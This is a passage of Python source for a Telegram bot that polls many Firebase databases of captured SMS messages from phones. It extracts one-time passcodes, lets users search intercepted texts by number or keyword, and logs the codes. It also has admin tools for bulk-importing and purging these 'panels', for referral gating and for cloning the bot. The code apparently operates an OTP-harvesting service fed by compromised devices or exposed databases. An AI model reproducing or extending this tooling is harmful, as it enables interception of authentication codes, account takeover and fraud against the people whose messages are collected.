         rbtn(sc("Last 5 OTPs"), "5206318837489743801", "success")],
        [rbtn(sc("Last 10 SMS"), "5253742260054409879", "primary"),
         rbtn(sc("Main Menu"), "6206497372176913599", "primary")],
    ], resize_keyboard=True)
    _chat_shortcut_cache[uid] = f"device:{d.id}"

    await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML")

    if otp:
        try:
            await update.message.reply_text(
                q("🔑 <b>tap to copy:</b>"),
                reply_markup=InlineKeyboardMarkup([[
                    ibtn(f"Copy OTP {otp}", copy_text=otp,
                         eid="4958689671950369798", style="success")
                ]]),
                parse_mode="HTML")
        except Exception: pass
    if d.numbers:
        try:
            await update.message.reply_text(
                q("📞 <b>tap to copy number:</b>"),
                reply_markup=InlineKeyboardMarkup([[
                    ibtn(f"Copy {d.numbers[0]}", copy_text=d.numbers[0],
                         eid="5253742260054409879", style="primary")
                ]]),
                parse_mode="HTML")
        except Exception: pass

async def _show_panel_devices(update: Update, ctx: ContextTypes, tag: str) -> None:
    devs = await fetch_db_devices(tag, DATABASES[tag])
    GLOBAL_DEVICE_CACHE[tag] = devs
    try:
        await seed_seen_ids_for_db(DATABASES[tag])
    except Exception: pass
    await _show_devices(update, ctx, devs, page=0)

async def _show_recent_otps(update: Update, ctx: ContextTypes, devs: list) -> None:
    uid = update.effective_chat.id
    admin = is_admin(uid)
    best: dict = {}

    sem = asyncio.Semaphore(20)
    async def one(d: Device):
        async with sem:
            return d, await get_device_sms(d, limit=8)

    results = await asyncio.gather(*(one(d) for d in devs))
    for d, smss in results:
        for sms in smss:
            body = sms.get("body") or sms.get("message") or sms.get("text") or ""
            o = extract_otp(body)
            if not o: continue
            lbl = d.numbers[0] if d.numbers else d.name
            try: ts = float(sms.get("timestamp", 0) or 0)
            except Exception: ts = 0
            cur = best.get(lbl)
            if not cur or ts > cur[2]:
                best[lbl] = (o, sms, ts, d)

    if not best:
        await update.message.reply_text(
            qres("5206318837489743801", "recent otps",
                 ["📭 <i>no recent otps found.</i>"]),
            reply_markup=main_menu_kb(admin), parse_mode="HTML")
        return

    lines = []
    for i, (lbl, (o, sms, ts, d)) in enumerate(
            sorted(best.items(), key=lambda kv: -kv[1][2])[:20], 1):
        body = sms.get("body") or sms.get("message") or sms.get("text") or ""
        site, eid = _detect_site(sms.get("sender", ""), body)
        icon = em(eid, "🌐")
        lines.append(
            f"{i}. {icon} <b>{esc(site)}</b>\n"
            f"    🔑 <code>{esc(o)}</code>  ·  📞 <code>{esc(lbl)}</code>\n"
            f"    📅 {esc(sms_date(sms))}"
        )
        _log_user_otp(uid=uid, number=lbl,
                      sender=sms.get("sender", "—"),
                      otp=o, body=body, ts=int(ts), panel=d.db_tag)

    await update.message.reply_text(
        qres("5206318837489743801", f"recent otps ({len(best)})", lines),
        reply_markup=main_menu_kb(admin), parse_mode="HTML")

async def _show_panel_status(update: Update, ctx: ContextTypes, admin: bool) -> None:
    lines = []
    total_dev = total_on = total_nums = 0
    for tag in sorted(DATABASES.keys()):
        if not admin and tag in ADMIN_ONLY_TAGS: continue
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        on = sum(1 for d in cached if d.status == "online")
        nums = sum(len(d.numbers) for d in cached if d.numbers)
        total_dev += len(cached); total_on += on; total_nums += nums
        bar = "🟢" if on > 0 else ("🔴" if cached else "⚫")
        lines.append(f"{bar} {esc(tag[:20])} — {on}/{len(cached)} · {nums} ☎")
    summary = [f"📱 total devices: <b>{total_dev}</b>",
               f"🟢 online: <b>{total_on}</b>",
               f"🔢 numbers: <b>{total_nums}</b>", ""] + lines[:30]
    await update.message.reply_text(qres("6206446249181189526", "panel status", summary),
                                    reply_markup=main_menu_kb(admin), parse_mode="HTML")

async def _handle_pagination(update: Update, ctx: ContextTypes, text: str, admin: bool) -> None:
    uid = update.effective_chat.id
    shortcut = _chat_shortcut_cache.get(uid, "")
    cur_page = _chat_page_cache.get(uid, 0)
    if text == "◀ Prev": new_page = max(0, cur_page - 1)
    elif text == "Next ▶": new_page = cur_page + 1
    else:
        m = re.fullmatch(r"(\d+)/(\d+)", text)
        if not m: return
        new_page = int(m.group(1)) - 1
    if shortcut == "devices":
        devs = await get_all_devices(admin)
        await _show_devices(update, ctx, devs, new_page)
    elif shortcut == "panels":
        tags = sorted([t for t in DATABASES if admin or t not in ADMIN_ONLY_TAGS])
        total_pages = max(1, (len(tags) + 11) // 12)
        new_page = max(0, min(new_page, total_pages - 1))
        kb, _ = panels_page_kb(tags, new_page)
        _chat_page_cache[uid] = new_page
        await update.message.reply_text(
            qres("5372849966689566579", "all panels",
                 [f"📡 total: <b>{len(tags)}</b>", "",
                  f"<i>page {new_page+1}/{total_pages}</i>"]),
            reply_markup=kb, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# PENDING INPUT
# ══════════════════════════════════════════════════════════════════
async def handle_pending_input(update: Update, ctx: ContextTypes,
                                act: dict, text: str, admin: bool) -> bool:
    action = act.get("action", "")
    uid = update.effective_chat.id

    if action == "search_number":
        clean = re.sub(r"\D", "", text)
        if len(clean) < 8:
            await update.message.reply_text(q("❌ <b>number too short.</b>"), parse_mode="HTML")
            return True
        devs = await get_all_devices(admin)
        matches = [d for d in devs
                   if any(clean in re.sub(r"\D", "", n) or re.sub(r"\D", "", n) in clean
                          for n in d.numbers)]
        if not matches:
            await update.message.reply_text(
                qres("5404561694510833322", "search results",
                     [f"📞 <code>{esc(clean)}</code>", "",
                      "❌ <i>no match found.</i>"]),
                reply_markup=main_menu_kb(admin), parse_mode="HTML")
            return True
        lines = []
        for i, d in enumerate(matches[:15], 1):
            num = d.numbers[0] if d.numbers else d.name
            icon = em("5224607267797606837", "🟢") if d.status == "online" \
                else em("6206479140040743133", "🔴")
            lines.append(f"{i}. {icon} <code>{esc(num)}</code>\n"
                         f"    🔥 <code>{esc(d.db_tag)}</code>")
            try:
                smss = await get_device_sms(d, limit=3)
                for s in smss:
                    body = s.get("body") or s.get("message") or s.get("text") or ""
                    o = extract_otp(body)
                    if o:
                        _log_user_otp(uid=uid, number=num,
                                      sender=s.get("sender", "—"),
                                      otp=o, body=body,
                                      ts=int(s.get("timestamp") or 0),
                                      panel=d.db_tag)
                        break
            except Exception: pass
        await update.message.reply_text(
            qres("5404561694510833322", f"search — {clean[:15]}",
                 [f"🎯 matches: <b>{len(matches)}</b>", ""] + lines),
            reply_markup=main_menu_kb(admin), parse_mode="HTML")
        return True

    if action == "search_keyword":
        kw = text.lower().strip()
        if not kw: return True
        devs = [d for d in await get_all_devices(admin) if d.numbers]
        wait = await update.message.reply_text(
            q(f"🔎 <b>scanning {len(devs)} devices for </b><code>{esc(kw)}</code>..."),
            parse_mode="HTML")
        sem = asyncio.Semaphore(20)
        async def one(d: Device):
            async with sem:
                return d, await get_device_sms(d, limit=SMS_LIMIT)
        results = await asyncio.gather(*(one(d) for d in devs))
        matches = []
        for d, smss in results:
            for s in smss:
                body = (s.get("body") or s.get("message") or s.get("text") or "")
                if kw in body.lower():
                    matches.append((d, s))
                    break
        try: await wait.delete()
        except Exception: pass
        if not matches:
            await update.message.reply_text(
                qres("6206479140040743133", f"keyword — {kw[:15]}",
                     ["❌ <i>no matches found.</i>"]),
                reply_markup=main_menu_kb(admin), parse_mode="HTML")
            return True
        lines = []
        for i, (d, s) in enumerate(matches[:15], 1):
            num = d.numbers[0] if d.numbers else d.name
            body = s.get("body") or s.get("message") or s.get("text") or ""
            o = extract_otp(body)
            site, eid = _detect_site(s.get("sender", ""), body)
            icon = em(eid, "🌐")
            line = f"{i}. {icon} <b>{esc(site)}</b>\n" \
                   f"    📞 <code>{esc(num)}</code>"
            if o:
                line += f"  ·  🔑 <code>{esc(o)}</code>"
                _log_user_otp(uid=uid, number=num,
                              sender=s.get("sender", "—"),
                              otp=o, body=body,
                              ts=int(s.get("timestamp") or 0),
                              panel=d.db_tag)
            lines.append(line)
        await update.message.reply_text(
            qres("6206479140040743133", f"keyword — {kw[:15]}",
                 [f"🎯 matches: <b>{len(matches)}</b>", ""] + lines),
            reply_markup=main_menu_kb(admin), parse_mode="HTML")
        return True

    if action == "add_dbs" and admin:
        await _process_db_import(update, ctx, text, act.get("mode", "all"))
        return True

    if action == "grant_access" and admin:
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            target = None
            for u, ud in all_users.items():
                if (ud.get("username") or "").lower() == text.strip().lstrip("@").lower():
                    target = u; break
        if not target:
            await update.message.reply_text(q("❌ <b>user not found.</b>"),
                                            parse_mode="HTML"); return True
        grant_access(target)
        await update.message.reply_text(q(f"✅ <b>access granted:</b> <code>{target}</code>"),
                                        parse_mode="HTML"); return True

    if action == "revoke_access" and admin:
        try: target = int(text.strip().lstrip("@"))
        except ValueError:
            await update.message.reply_text(q("❌ <b>invalid id.</b>"),
                                            parse_mode="HTML"); return True
        revoke_access(target)
        await update.message.reply_text(q(f"❌ <b>access revoked:</b> <code>{target}</code>"),
                                        parse_mode="HTML"); return True

    if action == "fj_add" and admin:
        if "|" in text:
            ch, url = [x.strip() for x in text.split("|", 1)]
        else:
            ch = text.strip()
            url = f"https://t.me/{ch[1:]}" if ch.startswith("@") else ""
        if not ch:
            await update.message.reply_text(q("❌ <b>invalid channel.</b>"),
                                            parse_mode="HTML"); return True
        FORCE_JOIN_CHANNELS.append({"channel": ch, "url": url})
        save_data()
        await update.message.reply_text(
            q(f"✅ <b>channel added:</b> <code>{esc(ch)}</code>"),
            reply_markup=admin_menu_kb(), parse_mode="HTML"); return True

    if action == "set_required_refs" and admin:
        try: n = int(text.strip())
        except ValueError:
            await update.message.reply_text(q("❌ <b>invalid number.</b>"),
                                            parse_mode="HTML"); return True
        global REQUIRED_REFERRALS
        REQUIRED_REFERRALS = max(0, n); save_data()
        await update.message.reply_text(q(f"✅ <b>required referrals:</b> {REQUIRED_REFERRALS}"),
                                        parse_mode="HTML"); return True

    if action == "broadcast" and admin:
        await _do_broadcast(ctx, uid, update.message)
        return True

    if action == "set_welcome_media" and admin:
        if update.message.photo:
            WELCOME_MEDIA.update(type="photo", file_id=update.message.photo[-1].file_id)
        elif update.message.video:
            WELCOME_MEDIA.update(type="video", file_id=update.message.video.file_id)
        else:
            await update.message.reply_text(q("❌ <b>send photo or video.</b>"),
                                            parse_mode="HTML"); return True
        save_data()
        await update.message.reply_text(q("✅ <b>welcome media set.</b>"),
                                        reply_markup=media_kb(), parse_mode="HTML"); return True

    if action == "set_welcome_text" and admin:
        global WELCOME_TEXT
        WELCOME_TEXT = update.message.html_text or text
        save_data()
        await update.message.reply_text(q("✅ <b>welcome text set.</b>"),
                                        reply_markup=media_kb(), parse_mode="HTML"); return True

    if action == "add_rotation_media" and admin:
        if update.message.photo:
            ROTATION_MEDIA.append({"type": "photo",
                                   "file_id": update.message.photo[-1].file_id,
                                   "spoiler": False})
        elif update.message.video:
            ROTATION_MEDIA.append({"type": "video",
                                   "file_id": update.message.video.file_id,
                                   "spoiler": False})
        else:
            await update.message.reply_text(q("❌ <b>send photo or video.</b>"),
                                            parse_mode="HTML"); return True
        save_data()
        await update.message.reply_text(q(f"✅ <b>rotation size:</b> {len(ROTATION_MEDIA)}"),
                                        reply_markup=media_kb(), parse_mode="HTML"); return True

    if action == "set_backup_target" and admin:
        try: cid = int(text.strip())
        except ValueError:
            await update.message.reply_text(q("❌ <b>invalid chat id.</b>"),
                                            parse_mode="HTML"); return True
        global AUTO_BACKUP_CHAT
        AUTO_BACKUP_CHAT = cid; save_data()
        await update.message.reply_text(_backup_status_text(),
                                        reply_markup=backup_kb(), parse_mode="HTML"); return True

    if action == "set_backup_times" and admin:
        times = []
        for p in text.split(","):
            p = p.strip()
            try:
                hh, mm = p.split(":")
                hh, mm = int(hh), int(mm)
                if 0 <= hh < 24 and 0 <= mm < 60:
                    times.append(f"{hh:02d}:{mm:02d}")
            except Exception: continue
        global AUTO_BACKUP_TIMES
        AUTO_BACKUP_TIMES = sorted(set(times)); save_data()
        await update.message.reply_text(_backup_status_text(),
                                        reply_markup=backup_kb(), parse_mode="HTML"); return True

    if action == "add_clone" and admin:
        tok = text.strip()
        if ":" not in tok or len(tok) < 30:
            await update.message.reply_text(q("❌ <b>invalid token.</b>"),
                                            parse_mode="HTML"); return True
        ok, uname = await _start_clone(tok, ctx)
        if ok:
            CLONES.append({"token": tok, "username": uname}); save_data()
            await update.message.reply_text(
                qres("5440621591387980068", "clone added", [f"🤖 @{esc(uname)}"]),
                reply_markup=clone_kb(), parse_mode="HTML")
        else:
            await update.message.reply_text(q("❌ <b>invalid token.</b>"), parse_mode="HTML")
        return True

    if action == "confirm_purge" and admin:
        if text.lower().strip() != "yes":
            await update.message.reply_text(q("❌ <b>purge cancelled.</b>"),
                                            reply_markup=admin_menu_kb(), parse_mode="HTML")
            return True
        dead = act.get("dead", [])
        for tag in dead: DATABASES.pop(tag, None)
        save_data()
        await update.message.reply_text(
            qres("5246772116543512028", "purge complete",
                 [f"🗑 removed: <b>{len(dead)}</b>",
                  f"📡 remaining: <b>{len(DATABASES)}</b>"]),
            reply_markup=admin_menu_kb(), parse_mode="HTML")
        return True

    return False

# ══════════════════════════════════════════════════════════════════
# DB IMPORT
# ══════════════════════════════════════════════════════════════════
def _parse_db_lines(text: str):
    out = []
    auto = 0
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        if "=" in line:
            tag, url = [x.strip() for x in line.split("=", 1)]
        else:
            url = line
            auto += 1
            tag = f"TAG{auto}"
        if not (url.startswith("http://") or url.startswith("https://")): continue
        out.append((tag, url.rstrip("/")))
    return out

async def _process_db_import(update: Update, ctx: ContextTypes, text: str,
                              mode: str = "all") -> None:
    entries = _parse_db_lines(text)
    if not entries:
        await update.message.reply_text(q("❌ <b>no valid firebase urls found.</b>"),
                                        parse_mode="HTML"); return
    wait = await update.message.reply_text(
        q(f"⏳ <b>processing {len(entries)} firebases (mode: {mode})...</b>"),
        parse_mode="HTML")
    added, skipped, dead = [], [], []
    for tag, url in entries:
        if tag in DATABASES or url in DATABASES.values():
            skipped.append(tag); continue
        if mode == "active":
            is_active, devs, fresh = await check_db_active(url, hours=ACTIVE_FB_HOURS)
            if not is_active or devs == 0:
                dead.append(tag); continue
        DATABASES[tag] = url
        added.append(tag)
    save_data()
    try: await wait.delete()
    except Exception: pass
    lines = [
        f"✅ added: <b>{len(added)}</b>",
        f"🔁 skipped (already there): <b>{len(skipped)}</b>",
        f"❌ dead/no-otp: <b>{len(dead)}</b>",
        f"📡 total panels: <b>{len(DATABASES)}</b>",
    ]
    if added: lines.append(f"<i>first few added: {esc(', '.join(added[:5]))}</i>")
    await update.message.reply_text(qres("5440621591387980068", f"import {mode} done", lines),
                                    reply_markup=admin_menu_kb(), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# PURGE / LIST / USER MANAGER / FJ MENU
# ══════════════════════════════════════════════════════════════════
async def _purge_dead_fbs(update: Update, ctx: ContextTypes) -> None:
    wait = await update.message.reply_text(q("🔍 <b>scanning all firebases...</b>"),
                                            parse_mode="HTML")
    dead, alive = [], []
    for tag, url in DATABASES.items():
        try:
            is_active, devs, fresh = await check_db_active(url, hours=DEAD_FB_HOURS)
            if is_active and devs > 0: alive.append(tag)
            else: dead.append(tag)
        except Exception:
            dead.append(tag)
    try: await wait.delete()
    except Exception: pass
    lines = [f"🟢 alive: <b>{len(alive)}</b>",
             f"🔴 dead: <b>{len(dead)}</b>", "",
             "<i>send 'yes' to confirm purge, anything else to cancel.</i>"]
    if dead: lines.append(f"dead tags: {esc(', '.join(dead[:8]))}")
    pending_action[update.effective_chat.id] = {"action": "confirm_purge", "dead": dead}
    await update.message.reply_text(qres("5246772116543512028", "dead firebases", lines),
                                    parse_mode="HTML")

async def _list_all_dbs(update: Update, ctx: ContextTypes) -> None:
    lines = [f"{i}. <code>{esc(tag)}</code>"
             for i, (tag, url) in enumerate(sorted(DATABASES.items()), 1)]
    await update.message.reply_text(
        qres("5372849966689566579", f"all dbs ({len(DATABASES)})", lines),
        reply_markup=admin_menu_kb(), parse_mode="HTML")

async def _user_manager_menu(update: Update, ctx: ContextTypes) -> None:
    banned = sum(1 for u in all_users.values() if u.get("banned"))
    await update.message.reply_text(
        qres("5339233635620899144", "user manager",
             [f"👥 total: <b>{len(all_users)}</b>",
              f"✅ allowed: <b>{len(allowed_users)}</b>",
              f"🚫 banned: <b>{banned}</b>"]),
        reply_markup=ReplyKeyboardMarkup([
            [rbtn(sc("View All Users"), "5372849966689566579", "primary"),
             rbtn(sc("Ban User"), "5246772116543512028", "danger")],
            [rbtn(sc("Unban User"), "6206479140040743133", "success")],
            [rbtn(sc("Admin Panel"), "6206404510689007446", "primary")],
        ], resize_keyboard=True), parse_mode="HTML")

async def _force_join_menu(update: Update, ctx: ContextTypes) -> None:
    lines = [f"state: <b>{'on' if FORCE_JOIN_ENABLED else 'off'}</b>",
             f"channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>", ""]
    for ch in FORCE_JOIN_CHANNELS:
        lines.append(f"📢 <code>{esc(ch.get('channel','—'))}</code>")
    await update.message.reply_text(
        qres("5246772116543512028", "force join", lines),
        reply_markup=ReplyKeyboardMarkup([
            [rbtn(sc("Add Force Join"), "5440621591387980068", "success"),
             rbtn(sc("Toggle Force Join"), "5235588635885054955", "primary")],
            [rbtn(sc("Admin Panel"), "6206404510689007446", "primary")],
        ], resize_keyboard=True), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# BROADCAST / BACKUP / CLONE
# ══════════════════════════════════════════════════════════════════
async def _do_broadcast(ctx: ContextTypes, uid: int, msg) -> None:
    targets = [u for u in all_users if u != uid and not all_users[u].get("banned")]
    sent = blocked = failed = 0
    wait = await ctx.bot.send_message(uid,
        qres("5253742260054409879", "broadcast running",
             [f"👥 recipients: <b>{len(targets)}</b>"]), parse_mode="HTML")
    for u in targets:
        try:
            await ctx.bot.copy_message(chat_id=u, from_chat_id=msg.chat_id,
                                       message_id=msg.message_id)
            sent += 1
        except Forbidden: blocked += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
    await wait.edit_text(
        qres("6206479140040743133", "broadcast complete",
             [f"✅ sent: <b>{sent}</b>",
              f"⛔ blocked: <b>{blocked}</b>",
              f"⚠️ failed: <b>{failed}</b>"]), parse_mode="HTML")

def _size_str(n: int) -> str:
    if n < 1024: return f"{n} B"
    if n < 1024**2: return f"{n/1024:.1f} KB"
    if n < 1024**3: return f"{n/1024**2:.2f} MB"
    return f"{n/1024**3:.2f} GB"

def _backup_status_text() -> str:
    return qres("5440621591387980068", "auto backup",
        [f"🎯 target: <code>{AUTO_BACKUP_CHAT or '—'}</code>",
         f"⏰ times: <b>{', '.join(AUTO_BACKUP_TIMES) if AUTO_BACKUP_TIMES else '—'}</b>",
         f"⚡ enabled: <b>{'yes' if AUTO_BACKUP_ENABLED else 'no'}</b>"])

async def _send_backup(bot: Bot, manual: bool = False) -> bool:
    if not AUTO_BACKUP_CHAT: return False
    try:
        await bot.send_document(
            chat_id=AUTO_BACKUP_CHAT,
            document=db_snapshot_bytes(),
            filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            caption=q(f"🗄 <b>{'manual' if manual else 'scheduled'} backup</b>"),
            parse_mode="HTML")
        return True
    except Exception as e:
        _log.error(f"backup send: {e}")
        return False

async def auto_backup_loop(app: Application) -> None:
    while True:
        try:
            if AUTO_BACKUP_ENABLED and AUTO_BACKUP_CHAT:
                now = datetime.now()
                today = now.strftime("%Y-%m-%d")
                hhmm = now.strftime("%H:%M")
                for t in AUTO_BACKUP_TIMES:
                    if t == hhmm and BACKUP_FIRED.get(t) != today:
                        BACKUP_FIRED[t] = today
                        ok = await _send_backup(app.bot)
                        _log.info(f"auto backup [{t}]: {'ok' if ok else 'fail'}")
        except Exception as e:
            _log.error(f"backup loop: {e}")
        await asyncio.sleep(30)

def _clone_status_text() -> str:
    lines = [f"🤖 clones: <b>{len(CLONES)}</b>", ""]
    for i, c in enumerate(CLONES, 1):
        running = "🟢" if c["token"] in CLONE_APPS else "🔴"
        lines.append(f"{running} {i}. @{esc(c.get('username','?'))}")
    return qres("5235588635885054955", "clone manager", lines)

async def _start_clone(token: str, ctx):
    if token in CLONE_APPS:
        return True, CLONE_APPS[token]["username"]
    try:
        test_bot = Bot(token)
        me = await test_bot.get_me()
        await test_bot.close()
        app = Application.builder().token(token).build()
        app.add_handler(CommandHandler("start", cmd_start))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
        app.add_handler(MessageHandler(filters.Document.ALL, on_document))
        await app.initialize()
        await app.start()
        await app.updater.start_polling(drop_pending_updates=True)
        CLONE_APPS[token] = {"app": app, "username": me.username}
        return True, me.username
    except Exception as e:
        _log.error(f"start clone: {e}")
        return False, ""

async def _stop_clone(token: str) -> None:
    entry = CLONE_APPS.pop(token, None)
    if not entry: return
    try:
        await entry["app"].updater.stop()
        await entry["app"].stop()
        await entry["app"].shutdown()
    except Exception: pass

# ══════════════════════════════════════════════════════════════════
# FILE HANDLER
# ══════════════════════════════════════════════════════════════════
async def on_document(update: Update, ctx: ContextTypes) -> None:
    uid = update.effective_chat.id
    admin = is_admin(uid)
    if not admin and not has_access(uid): return
    doc = update.message.document
    if not doc: return
    fname = doc.file_name or ""
    mime = doc.mime_type or ""

    act = pending_action.get(uid)
    if act:
        a = act.get("action")
        if a == "add_dbs":
            pending_action.pop(uid, None)
            if not (fname.lower().endswith(".txt") or "text" in mime.lower()):
                await update.message.reply_text(q("❌ <b>send .txt file.</b>"),
                                                parse_mode="HTML"); return
            tg = await ctx.bot.get_file(doc.file_id)
            buf = io.BytesIO()
            await tg.download_to_memory(buf)
            text = buf.getvalue().decode("utf-8", errors="ignore")
            await _process_db_import(update, ctx, text, mode=act.get("mode", "all"))
            return
        if a == "import_file":
            pending_action.pop(uid, None)
            tg = await ctx.bot.get_file(doc.file_id)
            buf = io.BytesIO()
            await tg.download_to_memory(buf)
            blob = buf.getvalue()
            try:
                if fname.lower().endswith(".sqlite"):
                    imported = import_sqlite(blob)
                else:
                    imported = import_json(blob)
            except Exception as e:
                await update.message.reply_text(q(f"❌ parse: <code>{esc(e)}</code>"),
                                                parse_mode="HTML"); return
            count_u = count_f = 0
            for k, v in imported["users"].items():
                try:
                    uid_i = int(k)
                    all_users[uid_i] = {**v, "banned": bool(v.get("banned")),
                                        "referrals": v.get("referrals", [])}
                    count_u += 1
                except Exception: pass
            for tag, url in imported["firebases"].items():
                if tag not in DATABASES:
                    DATABASES[tag] = url
                    count_f += 1
            save_data()
            await update.message.reply_text(
                qres("5440621591387980068", "import complete",
                     [f"👥 users: <b>{count_u}</b>",
                      f"📡 firebases: <b>{count_f}</b>"]),
                reply_markup=db_kb(), parse_mode="HTML")
            return

    await update.message.reply_text(q("❓ <b>no active import task.</b>"), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# CALLBACK (unwatch only)
# ══════════════════════════════════════════════════════════════════
async def on_callback(update: Update, ctx: ContextTypes) -> None:
    cq = update.callback_query
    if cq is None: return
    data = cq.data or ""
    uid = cq.from_user.id
    if data.startswith("unwatch:"):
        dev_id = data.split(":", 1)[1]
        if user_focus.get(uid) == dev_id:
            user_focus.pop(uid, None)
            save_data()
        try: await cq.answer("🔕 stopped watching", show_alert=False)
        except Exception: pass
        try: await cq.message.edit_reply_markup(reply_markup=None)
        except Exception: pass
        return
    try: await cq.answer()
    except Exception: pass

# ══════════════════════════════════════════════════════════════════
# POLL LOOP (refresh + forward)
# ══════════════════════════════════════════════════════════════════
async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    sem = asyncio.Semaphore(DB_CONCURRENCY)

    async def _refresh(tag, url):
        async with sem:
            try:
                devs = await fetch_db_devices(tag, url)
            except Exception:
                devs = None
            if devs:
                GLOBAL_DEVICE_CACHE[tag] = devs
            elif tag not in GLOBAL_DEVICE_CACHE:
                GLOBAL_DEVICE_CACHE[tag] = []

    while True:
        try:
            db_items = list(DATABASES.items())
            await asyncio.gather(*(_refresh(t, u) for t, u in db_items))

            if first_run:
                await asyncio.gather(*(seed_seen_ids_for_db(u) for _, u in db_items))
                first_run = False
                _log.info(f"OTP engine online — seeded {len(seen_ids)} existing sms")
            else:
                async def _poll(tag, url):
                    async with sem:
                        await poll_single_db(tag, url)
                await asyncio.gather(*(_poll(t, u) for t, u in db_items))
        except Exception as e:
            _log.error(f"poll: {e}")
        await asyncio.sleep(POLL_INTERVAL)

# ══════════════════════════════════════════════════════════════════
# ENTRYPOINT
# ══════════════════════════════════════════════════════════════════
async def post_init(app: Application) -> None:
    asyncio.create_task(poll_loop(app))
    asyncio.create_task(auto_backup_loop(app))
    for c in CLONES:
        ok, _ = await _start_clone(c["token"], None)
        if ok: _log.info(f"clone restored @{c.get('username','?')}")

def main() -> None:
    load_data()
    if not TOKEN:
        print("❌ BOT_TOKEN env var missing"); return
    app = (Application.builder().token(TOKEN).post_init(post_init).build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()